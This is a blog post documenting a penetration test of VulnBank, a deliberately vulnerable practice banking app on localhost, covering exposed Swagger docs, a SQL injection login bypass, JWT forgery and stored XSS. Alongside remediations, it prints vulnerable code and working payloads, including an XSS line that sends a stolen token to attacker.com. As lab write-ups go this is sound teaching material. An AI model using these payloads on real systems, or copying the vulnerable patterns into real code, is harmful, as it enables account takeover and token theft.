---
title: "VulnBank Series #1 — Recon, SQLi Auth Bypass & JWT Forgery"
date: 2026-07-15
categories: [VulnBank, Web Security]
tags: [vulnbank, sql-injection, jwt, api-security, swagger, authentication, owasp, cwe-89, cwe-347, cwe-200, burpsuite, mini-series]
classes: wide
header:
  image: /assets/images/VULNBANK/banner.png
  teaser: /assets/images/VULNBANK/banner.png
---

<style>
p { text-align: justify; }
</style>


**Target:** VulnBank — Deliberately Vulnerable Banking Application  
**Series:** VulnBank Pentest Mini-Series  
**Post:** 1 of others\-_-\
**Scope:** `http://localhost:5000`

---

## What is VulnBank?

![Banner](/assets/images/VULNBANK/homepage.png)

VulnBank is a deliberately vulnerable banking application built for practising application security testing, API security, and secure code review. It simulates a real fintech platform with features like user authentication, money transfers, virtual cards, bill payments, merchant APIs, and an AI customer support agent. All intentionally broken in realistic ways ฅ(^•ﻌ•^ฅ).

This series documents a full penetration test of VulnBank from first visit to complete compromise. Each post focuses on a specific vulnerability class. Every finding is documented with the actual request, the vulnerable code, and the remediation.

Post 1 covers the three findings that fell within the first hour of testing: unauthenticated API documentation exposure, SQL injection authentication bypass, and a critically weak JWT implementation.

---

## Methodology

Testing followed the OWASP Web Security Testing Guide (WSTG) v4.2 and OWASP API Security Top 10 (2023). Tooling used throughout this post: Burp Suite for request interception and manipulation, curl for quick API probing, and jwt.io for token analysis.

---

## Finding VB-001 — Unauthenticated API Documentation Exposure

**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-200 Exposure of Sensitive Information  
**OWASP:** A05:2021 Security Misconfiguration

### What Happened

First thing on any web application is to look for documentation. Browsed to `/api/docs/` and the full Swagger UI loaded with zero authentication prompt. The OpenAPI spec at `/static/openapi.json` was equally open.

This is not just a low-severity "information disclosure." The Swagger docs exposed the entire attack surface of the application in one page:

- Admin endpoints: `/sup3r_s3cr3t_admin`, `/admin/create_admin`, `/admin/delete_account/{user_id}`
- Internal SSRF endpoints: `/internal/secret`, `/internal/config.json`, `/latest/meta-data/iam/security-credentials/vulnbank-role`
- AI system endpoints: `/api/ai/system-info`, `/api/ai/chat/anonymous`

In a real fintech engagement, this cuts reconnaissance time from days to minutes. The attacker already knows every endpoint, every parameter, and every expected response format before they send a single malicious request.

![Swagger UI accessible without authentication](/assets/images/VULNBANK/docs.png)

![Admin and internal endpoints exposed in documentation](/assets/images/VULNBANK/admin-endpoint.png)

![Internal Endpoints exposed in the documentation](/assets/images/VULNBANK/internal-ssrf.png)

### Impact

Complete API surface mapping without authentication. An attacker discovers hidden admin endpoints, SSRF targets, and AI integration details before sending a single crafted request.

### Remediation

Disable Swagger UI entirely in production. If internal API documentation is needed, deploy it behind authentication with role-based access control. Never document internal-only or administrative endpoints in a publicly accessible specification.

---

## Finding VB-002 — SQL Injection Authentication Bypass

**Severity:** Critical  
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-89 SQL Injection  
**OWASP:** A03:2021 Injection

### What Happened

The login endpoint at `/login` accepts a JSON body with `username` and `password`. Intercepted the request in Burp and sent it to Repeater. Replaced the username with a classic SQL injection payload:

```json
{"username": "admin' OR '1'='1", "password": "anything"}
```

The response came back immediately with `"is_admin": true` and a valid JWT session token. Full administrative access without knowing any credentials.

The reason this works is simple: the application constructs the SQL query using Python string interpolation rather than parameterised statements. The injected payload modifies the query logic so that the WHERE clause evaluates to true for every row, and the first matching user (the admin) is returned.

![SQL injection payload in Burp Repeater confirming admin access](/assets/images/VULNBANK/jwt.png)

With the admin JWT in hand, navigating to `/sup3r_s3cr3t_admin` confirmed full access to the administrative dashboard.

![Admin dashboard accessed without valid credentials](/assets/images/VULNBANK/dashboard.png)

![Admin panel at the secret endpoint](/assets/images/VULNBANK/secret.png)

### Vulnerable Code

The problem is exactly what you'd expect from a lazy dev(-_-)...string interpolation directly into a SQL query:

```python
# database.py — vulnerable pattern
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

When the payload `admin' OR '1'='1` is inserted, the executed query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

The `OR '1'='1'` condition is always true. The query returns the first user in the table — the admin.

### Impact

An unauthenticated attacker gains complete administrative control over the banking platform. From that position, every other vulnerability in the application becomes accessible. This single finding enables full compromise of all customer accounts, transaction history, and virtual card data. In a production fintech environment, this is game over.

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXRqeGF4YTJ5ZnFvNm1qY2tnemlramttdzg3bTV1a3lpNW54bDVkbyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/LXbVibea2FMoIlqnhv/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">
     
### Remediation

Replace all string-interpolated queries with parameterised statements:

```python
# Correct implementation
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

Additionally: implement input validation before database interaction, apply least-privilege to the database user account, and adopt an ORM with built-in sanitisation.

---

## Finding VB-003 — Weak JWT Implementation: Signature Forgery and Privilege Escalation

**Severity:** Critical  
**CVSS:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-347 Improper Verification of Cryptographic Signature  
**OWASP:** A07:2021 Identification and Authentication Failures

### What Happened

After obtaining a JWT from the SQL injection bypass, inspecting the token at jwt.io revealed the signing secret as `secret123` —> hardcoded directly in `auth.py`. Damn. The token also carried no expiration claim, meaning once issued it is valid forever.

Worse, reading the source code revealed the verification logic accepts the `none` algorithm alongside `HS256`. When initial verification fails, it falls back to accepting tokens with no signature at all.

Three critical failures stacked on top of each other:

1. Hardcoded weak secret (`secret123`) discoverable from source code
2. `none` algorithm accepted — signature can be stripped entirely
3. No `exp` claim — tokens never expire

### Exploiting It

Using a legitimately registered low-privilege account:

1. Logged in normally and captured the JWT
2. Pasted the token into jwt.io
3. Decoded the payload and changed `"is_admin": false` to `"is_admin": true`
4. Entered `secret123` in the signature verification field
5. Copied the re-signed token
6. Used the forged token to access `/sup3r_s3cr3t_admin`

Full admin access from a standard user account without touching the login form.

![Hardcoded weak secret and none algorithm in source code](/assets/images/VULNBANK/weak-secret.png)

![Forging an admin token on jwt.io](/assets/images/VULNBANK/forged-token.png)

![Admin access achieved with forged token](/assets/images/VULNBANK/forget-token-worked.png)

### Vulnerable Code

```python
# auth.py — three vulnerabilities in one file

JWT_SECRET = "secret123"           # Hardcoded weak secret (CWE-326)
ALGORITHMS = ['HS256', 'none']     # Accepts unsigned tokens (CWE-347)

def generate_token(user_id, username, is_admin=False):
    payload = {
        'user_id': user_id,
        'username': username,
        'is_admin': is_admin,
        # No 'exp' claim — tokens never expire (CWE-613)
        'iat': datetime.datetime.utcnow()
    }
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')

def verify_token(token):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=ALGORITHMS)
        return payload
    except jwt.exceptions.InvalidSignatureError:
        # Falls back to NO verification if signature fails
        try:
            payload = jwt.decode(token, options={'verify_signature': False})
            return payload
        except:
            return None
```

### Impact

Any attacker who obtains the JWT secret from source code, the public repository, or brute force, can forge valid tokens for any account including administrators. Combined with the `none` algorithm acceptance, even without the secret, tokens can be stripped of their signature and modified freely. The missing expiration means stolen tokens provide permanent access with no automatic remediation path.

### Remediation

```python
import secrets

# Generate strong secret — store in environment variable, never in code
JWT_SECRET = os.environ.get('JWT_SECRET')

# Only accept HS256
ALGORITHMS = ['HS256']

def generate_token(user_id, username, is_admin=False):
    payload = {
        'user_id': user_id,
        'username': username,
        'is_admin': is_admin,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        'iat': datetime.datetime.utcnow()
    }
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')

def verify_token(token):
    # No fallback — reject anything that fails verification
    payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
    return payload
```

Additionally: implement token revocation for logout and privilege changes, and store secrets in a secrets manager rather than environment variables where possible.

---
 
## Finding VB-004 — Stored XSS and JWT Token Theft via localStorage
 
**Severity:** High  
**CVSS:** 8.3 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)  
**CWE:** CWE-79 Cross-Site Scripting + CWE-312 Cleartext Storage of Sensitive Information  
**OWASP:** A03:2021 Injection / A04:2021 Insecure Design
 
### What Happened
 
Two separate vulnerabilities that become a full account takeover chain when combined.
 
**First*: the application stores JWT session tokens in `localStorage`. This means any JavaScript running on the page can read them. The source code even acknowledges this explicitly with a comment: `// Vulnerability: Token stored in localStorage`.
 
*Second**: multiple places in the application reflect user input directly into the DOM without sanitisation. The admin dashboard search bar is reflected XSS. The user profile bio field is stored XSS — meaning the payload persists in the database and fires for every user who views the profile.
 
Put them together: an attacker sets their bio to a payload that reads the admin's JWT from `localStorage` and sends it to an attacker-controlled server. The next time any administrator views that profile through the user management panel, the payload fires silently and the admin's session token is exfiltrated.
 
### Part A — Reflected XSS in Admin Search
 
Log into the admin dashboard at `/sup3r_s3cr3t_admin`. In the user search bar, enter:
 
```html
<img src=x onerror=alert('XSS')>
```
 
The alert fires immediately. No encoding, no sanitisation, direct DOM reflection.
 
![Reflected XSS executing in admin search bar](/assets/images/VULNBANK/reflected-xss.png)
 
### Part B — Stored XSS via User Bio
 
Navigate to the profile section of any user account and update the bio with:
 
```html
<img src=x onerror=alert('XSS')>
```
 
Save it. The payload is stored in the database and executes every time the profile is rendered...both for the owner and for any admin who views it.
 
![Stored XSS payload executing from bio field](/assets/images/VULNBANK/stored-xss.png)
 
### Part C — JWT Exposed in localStorage
 
Open browser developer tools, navigate to Application, Local Storage, `localhost:5000`. The `jwt_token` key is sitting there in plaintext, readable by any JavaScript on the page.
 
![JWT token exposed in localStorage](/assets/images/VULNBANK/token-exposure.png)
 
### Part D — Full Chain: Admin Account Takeover
 
The attacker sets their bio to:
 
```html
<img src=x onerror="fetch('https://attacker.com/steal?token='+localStorage.getItem('jwt_token'))">
```
 
When any administrator visits the attacker's profile through the user management panel, the script fires silently. The admin JWT is sent to the attacker's server. The attacker now has a permanent admin session and since tokens have no expiration (VB-003), it stays valid indefinitely.
 
No interaction required beyond an admin doing their normal job.
 
### Vulnerable Code
 
```javascript
// Frontend — token stored where JS can reach it
localStorage.setItem('jwt_token', token);  // Vulnerability: Token stored in localStorage
 
// Admin dashboard search — direct DOM injection
document.getElementById('search-results').innerHTML = searchQuery;  // XSS vulnerability: Reflect user input directly
```
 
### Impact
 
A single stored XSS payload silently compromises every administrator who views the attacker's profile. Combined with VB-003 (no token expiration), the stolen credential is permanent. Combined with VB-002 (SQLi bypass), the attacker does not even need a registered account. They can bypass login, plant the payload, and wait.
 
### Remediation
 
For XSS: replace all `innerHTML` assignments with `textContent` for user-controlled data. If HTML rendering is genuinely needed, sanitise through DOMPurify before insertion. Implement a Content Security Policy header to block inline scripts as a defence-in-depth measure.
 
For token storage: move the JWT into an `HttpOnly`, `Secure`, `SameSite=Strict` cookie. JavaScript cannot read `HttpOnly` cookies, which eliminates the entire theft vector regardless of XSS.
 
---
 
## Findings Summary so far(+_+)
 
| ID | Finding | Severity | CVSS |
|---|---|---|---|
| VB-001 | Unauthenticated API Documentation Exposure | High | 7.5 |
| VB-002 | SQL Injection Authentication Bypass | Critical | 9.8 |
| VB-003 | Weak JWT Implementation | Critical | 9.1 |
| VB-004 | Stored XSS and JWT Token Theft | High | 8.3 |
 
Three findings. Two hours of testing. Full administrative access achieved through two independent paths before a single feature of the application was even tested.
 
---
 
## What Did We Learn?
 
**1. Swagger docs in production is a critical misconfiguration**  
The Swagger UI reduced reconnaissance from hours to minutes. Every endpoint, every parameter, every response schema was documented and public. In a real engagement this would be the first finding in the report and would immediately accelerate everything that follows.
 
**2. SQL injection in login endpoints is still happening in 2026**  
String interpolation directly into SQL queries is a decades-old mistake that still shows up in real applications. One payload and the entire authentication layer collapsed. Parameterised queries are not optional rather, they are the baseline.
 
**3. JWT security is not just about using JWT**  
Using JWT for session management means nothing if the secret is `secret123`, the `none` algorithm is accepted, and tokens never expire. Each of these three flaws alone is critical. All three together mean any attacker can forge permanent admin tokens with zero effort. JWT implementation is as important as the choice to use JWT in the first place.
 
**4. Vulnerabilities chain instantly**  
VB-001 told us the admin endpoint exists. VB-002 got us there via SQL injection. VB-003 gave us a second path to the same place through JWT forgery. Real attacks chain findings; finding one vulnerability is just the start of the map.
 
**Next post:** BOLA, BOPLA, and broken authorization across transaction history, virtual cards, and payment endpoints（^_^ ）.
 
---
 
<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXRqeGF4YTJ5ZnFvNm1qY2tnemlramttdzg3bTV1a3lpNW54bDVkbyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KIImenTBb3TmRFkJwT/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">
 
*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
 
